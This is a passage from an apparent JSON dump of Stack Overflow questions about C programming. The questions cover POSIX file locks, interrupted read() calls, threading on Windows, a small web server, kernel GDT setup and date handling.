numbers and +1 for positive numbers.\n<a href=\"http://en.wikipedia.org/wiki/Sign%5Ffunction\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Sign%5Ffunction</a>\nIt's easy enough to write my own, but it seems like something that ought to be in a standard library somewhere.</p>\n\n<p>Edit: Specifically, I was looking for a function working on floats.</p>\n"},{"tags":["c","unix","locking","posix","fcntl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":65,"score":3,"question_id":13220054,"title":"Are POSIX file locks reentrant?","body":"<p>I am using POSIX <strike>mandatory</strike> file locks through <code>fcntl</code>. I'm wondering if those locks are reentrant, ie. can a process acquire a lock it already owns ?</p>\n"},{"tags":["c","ternary-operator"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":13220087,"title":"pointer/integer type mismatch in conditional expression","body":"<pre><code>gcc 4.7.2 c89\n</code></pre>\n\n<p>Hello,</p>\n\n<p>I am getting the following warning:</p>\n\n<pre><code>pointer/integer type mismatch in conditional expression\n</code></pre>\n\n<p>I am compiling with the following <code>CFLAGS -Wall -Wextra</code></p>\n\n<pre><code>fprintf(stderr, \"'Failed to open file' Error [ %s ]\\n\",\n        (errno == 0) ? \"None\" : strerror(errno));\n</code></pre>\n\n<p>The program runs ok, but I can't see that the warning is all about. Both \"None\" and strerror(errno) return a string and not Integer value. And I am comparing errno number to zero.</p>\n\n<p>Many thanks for any suggestions,</p>\n"},{"tags":["c++","c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":9,"view_count":73,"score":-9,"question_id":13220065,"title":"Find given square matrix is upper or lower triangular or diagonal matrix?","body":"<p>Write a program in any language to find given square matrix is a upper triangular matrix or lower triangular matrix or diagonal matrix?</p>\n"},{"tags":["c","string","pointers","malloc"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":13023515,"title":"Why does scanf and malloc to char pointer work even if the size is not specified?","body":"<p>I am refreshing my C skills. I am using a char *s and using malloc to allocate memory to the s. Then using scanf, I read the input to s. But my question is I haven't specified a size for the memory chunk. But the program works. How does the memory gets allocated for the arbitrary length of the input string? Is scanf simply incrementing the pointer and writing data into the location?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char *s;\n    s = (char *) malloc(sizeof(s));    //I did not specify how much like malloc(sizeof(s) * 128)\n    if (s == NULL) {\n        fprintf(stderr, \"\\nError allocating memory for string\");\n        exit(1);\n    }\n    scanf(\"%s\", s);\n    puts(s);\n    free(s);\n    return 0;\n}\n\n/*\n    Input:\n    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n    Output:\n    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n*/\n</code></pre>\n"},{"tags":["c","file","unix","reading"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13218477,"title":"File read() function in Unix Systems","body":"<p>The code below restarts the <code>read()</code> function if it fails due to interruption by signal. The <code>read()</code> resumes its reading from where it was interrupted. So if <code>read()</code> is interrupted just before reading <code>EOF</code> character, what will it return that how many bytes it read?</p>\n\n<pre><code>int r_read(int fd, void *buf, int size)\n{\n   while((retval=read(fd,buf,size))==-1 &amp;&amp; errno ==EINTR);\n   return retval;\n}  \n</code></pre>\n\n<p>Regards.</p>\n"},{"tags":["c","windows","multithreading"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13218501,"title":"Creating array of threads on Windows","body":"<p>I'm trying to create an array of threads. In Linux, I did it this like:</p>\n\n<pre><code>pthread_t thr[MAXCONNECTIONS];\n</code></pre>\n\n<p>On Windows, I don't find any replacement for this. Is there anyway to create an array or something that replaces this?</p>\n"},{"tags":["c","dll"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":13218824,"title":"How to write Dll in C ?","body":"<p>I was looking online but always get tutorials for c++\nI want to write my first Dll in C , can anyone help? or maybe show a short example ?\nthanks !!</p>\n"},{"tags":["c","sqlite3"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":316,"score":0,"question_id":9766751,"title":"Check whether CREATE TABLE actually creates the table or whether it already existed?","body":"<p>I create table in SQLite without checking every time whether it exists.  </p>\n\n<pre><code>sqlite3_stmt* create_stmt = NULL;\nif (sqlite3_prepare_v2(db, \"CREATE TABLE mytable (sif INTEGER PRIMARY KEY, name VARCHAR, description VARCHAR);\", -1, &amp;create_stmt, NULL) == SQLITE_OK)\n{\n    sqlite3_step(create_stmt);\n    sqlite3_finalize(create_stmt);\n}\n</code></pre>\n\n<p>If the table doesn't exist, it will be created; if it exists, nothing happens.</p>\n\n<p>I would like to know if there is some way to get information whether the table is created or just checked?</p>\n"},{"tags":["c","file","unix","file-handling"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":35,"score":0,"question_id":13219526,"title":"Behavior Read() when interrupted in Unix","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13218477/file-read-function-in-unix-systems\">File read() function in Unix Systems</a>  </p>\n</blockquote>\n\n\n\n<p>Suppose the read() function has read 10 bytes of data and stored in buffer.Now if the read() function in unix is interrupted by signal and I restart the read function as shown below, where will be the next byte be stored in the buffer, either currentposition+1 or will be written from the start of the buffer.</p>\n\n<pre><code>int r_read(int fd, void *buf, int size)\n{\n   while((retval=read(fd,buf,size))==-1 &amp;&amp; errno ==EINTR);\n  return retval;\n}  \n</code></pre>\n\n<p>Regards</p>\n"},{"tags":["c","linux"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13216966,"title":"Remote sync directory in C","body":"<p>I have no experience in C, but...</p>\n\n<p>If I wanted to write a program, in C, for a linux system, that would sync a local file/directory to a remote file/directory, <em>automatically</em> when the local file/directory is updated; what libraries or built-ins should I look at?</p>\n\n<p>I looked at inotify so far, but I really lack the terminology to search for this without some help.</p>\n\n<p><strong>Edit</strong> </p>\n\n<p>This is merely an exercise.</p>\n"},{"tags":["c++","c","embedded","heap","dynamic-memory-allocation"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":13210723,"title":"Create a heap at a specific memory address for dynamic memory allocation","body":"<p>Is there a way to create a heap at a specific memory location (separate from the system heap) that can be used for dynamic memory allocation, but makes use of the dynamic memory allocator built into the C library.</p>\n\n<p>I'm looking for something functionally equivalent to this:</p>\n\n<pre><code>UserHeap heap(startAddress, size);\n\nvoid* allocatedMemory1 = heap.Allocate(100);  //Allocate 100 bytes.\nvoid* allocatedMemory2 = heap.Allocate(200);  //Allocate 200 bytes.\n\n/* ... Do seomthing useful with the memory ... */\n\nheap.Free(allocatedMemory1);\nheap.Free(allocatedMemory2);\n</code></pre>\n\n<p>This <a href=\"http://publib.boulder.ibm.com/infocenter/zvm/v6r2/index.jsp?topic=/com.ibm.zvm.v620.edclv/huheap.htm\" rel=\"nofollow\">uheap.h</a> seems to have what I'm looking for, but this doesn't seem to exist in newlib.  I'm wondering if GCC or newlib might have something.  If not I think I may end up porting <a href=\"http://www.malloc.de/en/\" rel=\"nofollow\">ptmalloc</a>.  However, its my understanding that this code is already in the C library and I'd hate to waste the memory reproducing it.</p>\n\n<p>I'm using Sourcery Codebench Lite (GCC) with newlib (C library).</p>\n"},{"tags":["c++","c","namespaces","derived-class","interface-design"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13219026,"title":"How to design a library with paralell interfaces in C and C++","body":"<p>My current project is a medium-sized library that is meant to have a C and a C++ interface at the same time. It centers around a single data type that I want to be accessible from C and C++ functions, because I want to encourage third parties to extend the library by writing functions in either language.</p>\n\n<p>I know about the basics of C/C++ mixing (compare for example <a href=\"http://www.parashift.com/c++-faq-lite/mixing-c-and-cpp.html\" rel=\"nofollow\">http://www.parashift.com/c++-faq-lite/mixing-c-and-cpp.html</a>) and have come up with the following solution:</p>\n\n<p>My basic design centers around creating a struct in C with all data exposed (this is what my C programmers expect) and deriving a class from it that hides member access, hopefully leading to safer access to the struct for C++ programmers. The problem comes in with the derivation: I want to use namespaces in C++ and hide the C interface. Of course, the C struct itself cannot be hidden (without resorting to the PIMPL idiom), but that's fine for me.</p>\n\n<p>The following example code compiles and runs without apparent errors with C and C++ \"client\" programs. However, I'm wondering if this solution is valid or if there are better solutions.</p>\n\n<p>Example code:</p>\n\n<pre><code>#ifdef __cplusplus__\nextern \"C\" {\n#endif\n\nstruct base\n{\n    char * data;\n}\n\n#ifdef __cplusplus__\n} // extern \"C\"\nnamespace {\nextern \"C\" {\n#endif\n\n/* cleanly initialize struct */\nstruct base * new_base (struct base *);\n\n/* cleanly destroy struct */\nvoid del_base (struct base *);\n\n#ifdef __cplusplus__\n} } // namespace, extern \"C\"\n\n#include&lt;new&gt;\n\nnamespace safe {\n\nclass base_plus : private base\n{\npublic:\n    base_plus () \n    { \n        if (! new_base(this)) \n            throw std::bad_alloc ();\n    }\n\n    ~base_plus ()\n    {\n        del_base (this);\n    }\n};\n\n} // namespace safe\n\n#endif\n</code></pre>\n"},{"tags":["c","linux","signals","posix"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":55,"score":4,"question_id":13219071,"title":"Which \"fatal\" signals should a user-level program catch?","body":"<p>First of all, <a href=\"http://stackoverflow.com/questions/5297062/recommended-signals-to-catch\">I do know that there was a similar question here in the past</a>.</p>\n\n<p>But that question wasn't answered properly. Instead, it diverted into suggestion what to do to catch signals.</p>\n\n<p>So just to clarify: I've done whatever needs to be done to handle signals.\nI have an application that forks a daemon that monitors the main process through pipe.\nIf a main process crashes (e.g. segmentation fault), it has a signal handler that writes all the required info to pipe and aborts.</p>\n\n<p>The goal is to have as much info as possible <em>when something bad happens to the application</em>, w/o messing with \"normal\" operation, such as SIGHUP, SIGUSR1, etc.</p>\n\n<p>So my question is: <strong>which signals should I catch?</strong>\nI mean signals that w/o me catching them would cause application to abort anyway.</p>\n\n<p>So far I've come up with the following list:</p>\n\n<ul>\n<li>SIGINT (^C, user-initiated, but still good to know)</li>\n<li>SIGTERM (<code>kill &lt;pid&gt;</code> from shell or, AFAIK, can be result of OutOfMemory)</li>\n<li>SIGSEGV</li>\n<li>SIGILL</li>\n<li>SIGFPE</li>\n<li>SIGBUS</li>\n<li>SIGQUIT </li>\n</ul>\n\n<p>Does anybody know if I miss something? <code>kill -l</code> has lots of them... :)</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13218817,"title":"Defining a pointer to a struct gives me not declared in this scope error","body":"<p>So I define a structure </p>\n\n<pre><code>struct PAIR{\n    int a;\n    int b;\n    int dist;\n};\n</code></pre>\n\n<p>and after this in a function I try to define Pair * vec; and it gives me </p>\n\n<pre><code>optim.cpp:97:4: error: ‘Pair’ was not declared in this scope\noptim.cpp:97:10: error: ‘vec’ was not declared in this scope\n</code></pre>\n\n<p>What's the problem? </p>\n"},{"tags":["c","multithreading","sockets"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13218880,"title":"windows createthread webserver","body":"<p>I wrote a select webserver and I was trying to set this to a multithreaded server. </p>\n\n<p>The program runs but when I go to localhost:9001/index.html</p>\n\n<p>the program just closes it doesn't do anything.</p>\n\n<p>This is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;winsock2.h&gt;\n#include &lt;winsock.h&gt;\n#include &lt;Ws2tcpip.h&gt;\n#include &lt;time.h&gt;\n#include &lt;process.h&gt; \n\n\n#pragma comment(lib, \"ws2_32.lib\" )\n#define BUFFSIZE 1000\n#define PORT \"9001\"\n#define MAXCONNECTIONS 10\n\nint main()\n{\n    WSADATA wsaData;\n    int yes = 1;        // reuse address\n    int rv;\n    int conn = 0;\n    int loop = 0;\n    int listener;       // file descriptor on socket\n    int newfd;          // new client file descriptor\n    struct sockaddr_storage clientaddr; // client address\n    struct addrinfo serverinfo, *socketlist, *sock;\n    socklen_t addrlen;  // length of addres\n    void *newf;\n    HANDLE thr[MAXCONNECTIONS];\n\n\n    if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0) \n    {\n        fprintf(stderr, \"WSAStartup failed.\\n\");\n        exit(1);\n    }\n\n    // Get a socket and bind for listening\n    memset(&amp;serverinfo, 0, sizeof(serverinfo));\n    serverinfo.ai_family = AF_INET;\n    serverinfo.ai_socktype = SOCK_STREAM;\n    serverinfo.ai_flags = AI_PASSIVE; // we search a socket on our side (server side) for listening\n\n    if((rv = getaddrinfo(NULL,PORT,&amp;serverinfo,&amp;socketlist)) != 0)\n    {\n        fprintf(stderr,\"Server: %s\\n\",gai_strerror(rv));\n        exit(1);\n    }\n\n    // loop trough sockets\n    for(sock = socketlist; sock != NULL; sock = sock-&gt;ai_next)\n    {\n        listener = socket(sock-&gt;ai_family, sock-&gt;ai_socktype, sock-&gt;ai_protocol);\n        if(listener &lt; 0)\n        {\n            continue; // not correct socket\n        }\n        setsockopt(listener,SOL_SOCKET,SO_REUSEADDR, &amp;yes, sizeof(int));\n        if(bind(listener, sock-&gt;ai_addr, sock-&gt;ai_addrlen) &lt; 0)\n        {\n            closesocket(listener);\n            continue; // could not bind to socket\n        }\n        break;\n    }\n\n    // if could not get socket\n    if(sock == NULL)\n    {\n        fprintf(stderr,\"Server: %s\\n\",\"Could not bind to socket\");\n        exit(2);\n    }\n\n    // free up list, we have the socket\n    freeaddrinfo(socketlist);\n\n    // listen on socket\n    if(listen(listener,MAXCONNECTIONS) &lt; 0)\n    {\n        perror(\"Server: listen\");\n        exit(3);\n    }\n\n    fprintf(stdout,\"Server: %s\\n\",\"Waiting for connections...\");\n\n    for(;;)\n    {\n        addrlen = sizeof clientaddr;\n        if((newfd = accept(listener,(struct sockaddr*)&amp;clientaddr,&amp;addrlen)) &lt; 0)\n        {\n            perror(\"Server: accept\");\n            exit(4);\n        }\n\n        newf = (void*) newfd;\n\n        // Create thread\n        if (( thr[conn] = CreateThread(NULL,0,client,newf,0,NULL)))\n        {\n            perror(\"Server: pthread_create\");\n            exit(5);\n        }\n\n        if(conn+1 == MAXCONNECTIONS)\n        {\n            loop = 1;\n        }\n        conn = (conn+1) % 10;\n\n        if( loop == 1 )\n        {\n            WaitForSingleObject(thr[conn],NULL);\n            CloseHandle(thr[conn]);\n        }\n\n    }\n    WSACleanup();\n    return 0;\n}\n\nDWORD WINAPI client(void * fd)\n{\n    int i = (int) fd;\n    int recvbytes;      // amount of bytes received\n    char buffer[BUFFSIZE]; // buffer for request\n    char result[BUFFSIZE];\n    char result2[BUFFSIZE];\n    char  * path;\n    char * extension;\n\n    // handle data from request\n    if((recvbytes = recv(i,buffer,BUFFSIZE-1,0)) == -1)\n    {\n        if(recvbytes == 0) //connection closed\n        {\n            fprintf(stdout,\"Server: socket %d goodbye\\n\",i);\n        }\n        else //request error [BAD REQUEST]\n        {\n            perror(\"Server: recv\");\n        }\n        closesocket(i);\n    }\n    else\n    {\n        if(recvbytes &gt; 0)\n        {\n            buffer[recvbytes]='\\0';\n        }\n        fprintf(stdout,\"Server: request received:\\n\");\n        //Get path\n        path = getPath(buffer,0, result);\n        if(strcmp(path,\"error\") != 0)\n        {\n            extension = getPath(buffer,1,result2);\n            if(strcmp(extension,\"error\") != 0)\n            {\n                // send file 200\n                sendData(extension,path,i,200);\n            }\n        }\n        else\n        {\n            // send code 400\n            sendData(\"html\",\"400.html\",i,400);\n        }\n\n        closesocket(i);\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","algorithm","sorting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":171,"score":-1,"question_id":13212185,"title":"Algorithm to find count of numbers between 2 integers where digits do not repeat","body":"<p>I'm looking for an algorithm to find a list of numbers between two integers such that the digits in each number don't repeat?  </p>\n\n<p>For example, given an input of 2 and 12, the answer would be all numbers except 11. \nThe naive solution would be to iterate over the numbers and check whether any digit repeats.  However, for big numbers, this approach would take a huge amount of time.</p>\n"},{"tags":["c","date","char"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13215896,"title":"issue with using char type for date in c","body":"<p>I am new to c and im in a weird situation: I am trying to update a date which I have taken as string input and my code is</p>\n\n<pre><code>typedef struct Employee\n{\nchar fname[20];\nchar lname[20];\nint eme_id;\nint emr_id;\nchar department[20];\nint age;\nchar join_date[20];\nfloat bsal;\nfloat pol_value;\nchar pol_start_date[20];\nchar pol_end_date[20];\nfloat premium;\nfloat pre_payment;\nchar pre_pay_date[20];\nint pre_status;/* 0 then not paid 1 then paid*/\nfloat bonus;\n}Employee;\n\n\nchar *update_date(char *dat)\n{\n\nchar *result = NULL;\nprintf(dat);\nresult = strtok( dat, \"/\" );\nint date[3];\nint i=0;\nwhile( result != NULL ) {\n    printf( \"result is \\\"%s\\\"\\n\", result );\n    date[i] = atoi( result );\n    printf( \"%d\\n\", date[i] );\n    i++;\n    result = strtok( NULL, \"/\" );\n}\n\nif(date[1]!=12)\n{\n    date[1]++;\n}\nelse\n{\n    date[1]=1;\n    date[2]++;\n}\n\nchar a[20];\nchar b[20];\nchar c[20];\nchar d[20];\nsprintf(a, \"%d\", date[0]);\nsprintf(b, \"%d\", date[1]);\nsprintf(c, \"%d\", date[2]);\n\nstrcpy (d,a);\nstrcat (d,\"/\");\nstrcat (d,b);\nstrcat (d,\"/\");\nstrcat (d,c);\n\nprintf(d);\nreturn d;\n}\n</code></pre>\n\n<p>here this function is working just fine but when im calling it in side another function like</p>\n\n<pre><code>while(fread(&amp;eme,recsize_eme,1,fq)==1)\n            {\n\n                char *hell;\n                hell = update_date(eme.pre_pay_date);\n                printf(\"%s\",hell);\n            }\n</code></pre>\n\n<p>now it prints some arbitrary text..:/\nplz someone help me out</p>\n"},{"tags":["python","c","header","libraries"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13218627,"title":"Python.h on windows with MinGW","body":"<p>I have a issue when importing Python.h in a C code</p>\n\n<pre><code>No such file or directory\n</code></pre>\n\n<p>I m on windows 7 64 bits with codeblocks IDE MinGW compiler</p>\n\n<p>please can someone help me with installing python c librarie?</p>\n"},{"tags":["c","msgpack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13202058,"title":"Why are MsgPack keys of type msgpack_object?","body":"<p>In the C API for MsgPack, why are keys (for example the key field of msgpack_object_kv) of type msgpack_object?</p>\n\n<p><a href=\"https://github.com/msgpack/msgpack-c/blob/master/src/msgpack/object.h\" rel=\"nofollow\">https://github.com/msgpack/msgpack-c/blob/master/src/msgpack/object.h</a></p>\n\n<p>Why aren't they just msgpack_object_raw?  Can they be any type?</p>\n"},{"tags":["c","windows","stream","mingw"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13217690,"title":"Is there no fopencookie or fmemopen in MinGW?","body":"<p>What can I use instead to write custom streams?</p>\n"},{"tags":["c","function","emacs","elisp","prototype"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":13217957,"title":"Get the function prototype using emacs","body":"<p>I got a C program edited with emacs. </p>\n\n<p>The C program is not important it looks like </p>\n\n<pre><code>int main(int ac, char **av)\n{\n....\n}\nint func(void){...}\nint anotherfunc(int a, char c, void *data){...}\n</code></pre>\n\n<p>can we have a Elisp function which parse the current buffer with those functions and catch the function prototype ?</p>\n\n<p>I already use etags but I just have </p>\n\n<pre><code>int main(\nint func(\n</code></pre>\n\n<p>But i would like have </p>\n\n<pre><code>int main(int ac, char **av)\nint func(void)\nint anotherfunc(int a, char c,  void *data)\n</code></pre>\n\n<p>Thanks a lot</p>\n"},{"tags":["c","reference","undefined","codeblocks"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13214889,"title":"Undefined reference error in C using Code::Blocks IDE","body":"<p>I'm trying to set up some .c files to make it easier on me to find things, once it starts becoming larger. I'll be using SDL calls in the program, hence the includes.</p>\n\n<p>Here's how my main.cpp looks right now:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;SDL.h&gt;\n#include &lt;SDL_gfxPrimitives.h&gt;\n#include &lt;SDL_ttf.h&gt;\n#include \"WriteText.h\"\n\nint main(int argc, char *argv[])\n{\nint i =0;\ni = b();\n\nreturn 0;\n}\n</code></pre>\n\n<p>In my WriteText.c I have:</p>\n\n<pre><code>#include \"WriteText.h\"\n\nint b(void)\n{\nreturn 3;\n}\n</code></pre>\n\n<p>Finally my WriteText.h:</p>\n\n<pre><code>#ifndef WRITETEXT_H_INCLUDED\n#define WRITETEXT_H_INCLUDED\n\nint b(void);\n\n#endif // WRITETEXT_H_INCLUDED\n</code></pre>\n\n<p>Trying to compile it, I get an undefined reference to 'b()'. I have no idea why this is happening, I practiced it in some basic example codes and everythin works just fine, but as soon as I'd actually use it for something practical I hit an error like this.</p>\n"},{"tags":["c","file","fwrite","getchar"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13216643,"title":"Nothing is getting written to file","body":"<p>Code:</p>\n\n<pre><code>struct subscriber\n{\nchar phonenumber[20];\nchar name[50];\nfloat amount;\n}s;\n\nvoid addrecords()\n{\n  FILE *f;\n  char test;\n  f=fopen(\"file.txt\",\"ab+\");\n  //if(f==0)\n  //{   f=fopen(\"file.txt\",\"wb+\");\n    //system(\"clear\");\n    //printf(\"please wait while we configure your computer\");\n    //printf(\"/npress any key to continue\");\n    //getchar();\n    //getch();\n  //}\n\n  while(1)\n  {\n    //system(\"clear\");\n    printf(\"\\n Enter phone number:\");\n    scanf(\"%s\",s.phonenumber);\n    printf(\"\\n Enter name:\");\n    fflush(stdin);\n    //scanf(\"%[^\\n]\",s.name);\n\n    scanf(\"%s\",s.name);\n    printf(\"\\n Enter amount:\");\n    scanf(\"%f\",&amp;s.amount);\n    printf(\"check 1\");\n    fwrite(&amp;s,sizeof(s),1,f);\n    fflush(stdin);\n    printf(\"check 2\");\n    //system(\"clear\");\n    printf(\"1 record successfully added\");\n    printf(\"\\n Press esc key to exit, any other key to add other record:\");\n    test=getchar();\n    //test=getche();\n    if(test==27)\n      break;\n  }\n  fclose(f);\n}\n</code></pre>\n\n<p>I am facing two problems here:</p>\n\n<ol>\n<li>Nothing is getting written to file although file is being created.</li>\n<li>After I enter the amount it outputs all the print statements and goes to the initial of the while loop that is it does not wait at getchar.</li>\n</ol>\n"},{"tags":["c","multithreading","testing","thread-safety"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":13217904,"title":"How can I test a thread-safe implementation in c?","body":"<p>I have a thread-safe program which I would like to test (see below). I am not sure how to proceed with starting a test program as this would be my first test program. The result should be a demonstration that uses this thread-safe program implementation and why it is the best alternativ to test a thread-safe program like the example.</p>\n\n<pre><code>#include &lt;errno.h&gt;\n#include &lt;pthread.h&gt;\nstatic pthread_mutex_t listlock = PTHREAD_MUTEX_INITIALIZER;\n\nint accessdata_r(void) {  /* return nonnegative traversal key if successful */ \n   int error;   \n   int key;\n   if (error = pthread_mutex_lock(&amp;listlock)) {        /* no mutex, give up */\n      errno = error;\n      return -1; \n   }\n   key = accessdata();\n   if (key == -1) {\n      error = errno;\n      pthread_mutex_unlock(&amp;listlock);\n      errno = error;\n      return -1;\n   }\n   if (error = pthread_mutex_unlock(&amp;listlock)) {\n      errno = error;\n      return -1;\n   }\n   return key;\n}\n\nint adddata_r(data_t data) {        /* allocate a node on list to hold data */\n   int error;\n   if (error = pthread_mutex_lock(&amp;listlock)) {        /* no mutex, give up */\n      errno = error;\n      return -1;\n   }\n   if (adddata(data) == -1) {\n      error = errno;\n      pthread_mutex_unlock(&amp;listlock);\n      errno = error;\n      return -1;\n   }\n   if (error = pthread_mutex_unlock(&amp;listlock)) {\n      errno = error;\n      return -1;\n   }\n   return 0; \n}\n\nint getdata_r(int key, data_t *datap) {             /* retrieve node by key */\n   int error;\n   if (error = pthread_mutex_lock(&amp;listlock)) {        /* no mutex, give up */\n      errno = error;\n      return -1;\n   }\n   if (getdata(key, datap) == -1) {\n      error = errno;\n      pthread_mutex_unlock(&amp;listlock);\n      errno = error;\n      return -1;\n   }\n   if (error = pthread_mutex_unlock(&amp;listlock)) {\n      errno = error;\n      return -1;\n   }\n   return 0; \n}\n\nint freekey_r(int key) {                                    /* free the key */\n   int error;\n   if (error = pthread_mutex_lock(&amp;listlock)) {        /* no mutex, give up */\n      errno = error;\n      return -1;\n   }\n   if (freekey(key) == -1) {\n      error = errno;\n      pthread_mutex_unlock(&amp;listlock);\n      errno = error;\n      return -1;\n   }\n   if (error = pthread_mutex_unlock(&amp;listlock)) {\n      errno = error; \n      return -1;   \n   } \n   return 0;  \n}\n</code></pre>\n"},{"tags":["c","constants","const-correctness"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":13181546,"title":"const correctness for structs with pointers","body":"<p>I have a struct which contains some pointers. I want the value of these to be unmodifiable. But simply writing const infront doesn't make the structs members unmutable</p>\n\n<pre><code>typedef struct{\n  int *x;\n  int *y;\n}point;\n\nvoid get(const  point *p,int x, int y){\n  p-&gt;x[0]=x;//&lt;- this should not be allowed\n  p-&gt;y[0]=y;//&lt;- this should not be allowed\n}\n</code></pre>\n\n<p>Can someone point me in the right direction.</p>\n\n<p>EDIT:</p>\n\n<p>So it would seem that there is no simple way of using the function prototype to tell that everything belonging to the struct should be unmodifiable</p>\n"},{"tags":["c","compiler-warnings"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13211618,"title":"getting warning \"assignment makes integer from pointer without a cast\"","body":"<p>I get this warning on line 59:</p>\n\n<blockquote>\n  <p>assignment makes integer from pointer without a cast.</p>\n</blockquote>\n\n<p>How can I fix it? Here is the whole file (copied from <a href=\"http://pastebin.com/BrmjBAS0\" rel=\"nofollow\">http://pastebin.com/BrmjBAS0</a>):</p>\n\n<pre><code>/* bkerndev - Bran's Kernel Development Tutorial\n*  By:   Brandon F. (friesenb@gmail.com)\n*  Desc: Global Descriptor Table management\n*\n*  Notes: No warranty expressed or implied. Use at own risk. */\n\n\n/* Defines a GDT entry */\nstruct gdt_entry\n{\n    unsigned short limit_low;\n    unsigned short base_low;\n    unsigned char base_middle;\n    unsigned char access;\n    unsigned char granularity;\n    unsigned char base_high;\n} __attribute__((packed));\n\nstruct gdt_ptr\n{\n    unsigned short limit;\n    unsigned int base;\n} __attribute__((packed));\n\n/* Our GDT, with 3 entries, and finally our special GDT pointer */\nstruct gdt_entry gdt[3];\nstruct gdt_ptr gp;\n\n/* This is in start.asm. We use this to properly reload\n*  the new segment registers */\nextern void _gdt_flush();\n\n/* Setup a descriptor in the Global Descriptor Table */\nvoid gdt_set_gate(int num, unsigned long base, unsigned long limit, unsigned char access, unsigned char gran)\n{\n    /* Setup the descriptor base address */\n    gdt[num].base_low = (base &amp; 0xFFFF);\n    gdt[num].base_middle = (base &gt;&gt; 16) &amp; 0xFF;\n    gdt[num].base_high = (base &gt;&gt; 24) &amp; 0xFF;\n\n    /* Setup the descriptor limits */\n    gdt[num].limit_low = (limit &amp; 0xFFFF);\n    gdt[num].granularity = ((limit &gt;&gt; 16) &amp; 0x0F);\n\n    /* Finally, set up the granularity and access flags */\n    gdt[num].granularity |= (gran &amp; 0xF0);\n    gdt[num].access = access;\n}\n\n/* Should be called by main. This will setup the special GDT\n*  pointer, set up the first 3 entries in our GDT, and then\n*  finally call gdt_flush() in our assembler file in order\n*  to tell the processor where the new GDT is and update the\n*  new segment registers */\nvoid gdt_install()\n{\n    /* Setup the GDT pointer and limit */\n    gp.limit = (sizeof(struct gdt_entry) * 3) - 1;\n    gp.base = &amp;gdt;\n\n    /* Our NULL descriptor */\n    gdt_set_gate(0, 0, 0, 0, 0);\n\n    /* The second entry is our Code Segment. The base address\n    *  is 0, the limit is 4GBytes, it uses 4KByte granularity,\n    *  uses 32-bit opcodes, and is a Code Segment descriptor.\n    *  Please check the table above in the tutorial in order\n    *  to see exactly what each value means */\n    gdt_set_gate(1, 0, 0xFFFFFFFF, 0x9A, 0xCF);\n\n    /* The third entry is our Data Segment. It's EXACTLY the\n    *  same as our code segment, but the descriptor type in\n    *  this entry's access byte says it's a Data Segment */\n    gdt_set_gate(2, 0, 0xFFFFFFFF, 0x92, 0xCF);\n\n    /* Flush out the old GDT and install the new changes! */\n    _gdt_flush();\n}\n</code></pre>\n"},{"tags":["c","date","rtc","days"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":13209097,"title":"How to calculate the date after x days in C","body":"<p>I'm programming a microcontroller in C that has an internal RTC and automatically increments a day counter (0-65536). So, given the initial date adjusted by the user (DD/MM/YYYY), I need to keep the calendar updated based on that counter. That is, I need to know how to calculate the date after x days. Does anyone know an algorithm for that? Couldn't find anything all over the web.</p>\n\n<p>Thanks in advance.\nDaniel</p>\n"},{"tags":["c","multithreading","pthreads"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":13217761,"title":"Inter Thread Communication in 